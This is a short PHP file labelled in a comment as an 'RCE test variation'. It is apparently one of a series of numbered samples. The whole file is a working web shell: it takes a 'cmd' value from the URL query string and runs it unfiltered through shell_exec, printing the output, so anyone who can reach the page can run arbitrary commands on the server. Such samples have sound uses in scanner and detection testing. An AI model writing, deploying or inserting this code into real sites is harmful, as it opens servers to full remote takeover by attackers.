<?php
// RCE test variation #73
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>